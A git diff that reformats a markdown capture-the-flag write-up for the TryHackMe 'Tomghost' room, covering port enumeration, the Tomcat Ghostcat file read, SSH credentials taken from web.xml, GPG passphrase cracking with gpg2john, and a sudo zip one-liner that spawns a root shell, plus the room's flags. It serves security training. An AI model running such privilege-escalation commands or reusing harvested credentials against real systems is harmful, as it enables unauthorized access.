@@ -1,17 +1,19 @@
 ---
 sticker: emoji//1f47b
 ---
-# ENUMERATION
----
 
+# TOMGHOST
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
 
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE    |
-| :--- | :--------- |
+| ---- | ---------- |
 | 22   | ssh        |
 | 53   | tcpwrapped |
 | 8009 | ajp13      |
@@ -39,50 +41,43 @@ PORT     STATE SERVICE    REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 From the scan, we can check that we're dealing with `apache tomcat 9.0.30`, we can look up for vulnerabilities regarding this version:
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331134324.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331134324.png)
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331134331.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331134331.png)
 
 We can look up this in `metasploit`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331134514.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331134514.png)
 
 Let's test if it works:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331134552.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331134552.png)
 
 It works, let's proceed with exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 Since we were able to read the `/WEB-INF/web.xml` file, we noticed it came with some credentials, we can access `ssh` with them:
-
 
 ```
 skyfuck:8730281lkjlkjdqlksalks
 ```
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331135832.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331135832.png)
 
 Let's begin privesc.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 If we check `skyfuck` home, we can find this:
 
@@ -93,7 +88,7 @@ credential.pgp  tryhackme.asc
 
 We got some encrypted credentials, but to our luck we also got the `.asc` private file to decrypt, let's do it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331140554.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331140554.png)
 
 If we try importing it, we notice we need a passphrase, let's use `gpg2john` to get it:
 
@@ -151,7 +146,6 @@ merlin@ubuntu:~$ cat user.txt
 THM{GhostCat_1s_so_cr4sy}
 ```
 
-
 We can check our privileges:
 
 ```
@@ -166,7 +160,7 @@ User merlin may run the following commands on ubuntu:
 
 We got root permissions on `/usr/bin/zip`, let's check it on `gtfobins`
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331141148.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331141148.png)
 
 We can do the following in order to get an interactive shell as root:
 
@@ -175,7 +169,7 @@ TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh -c "sh <&2 1>&2"'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331141357.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331141357.png)
 
 We can now read `root.txt`:
 
@@ -184,5 +178,4 @@ We can now read `root.txt`:
 THM{Z1P_1S_FAKE}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250331141444.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250331141444.png)
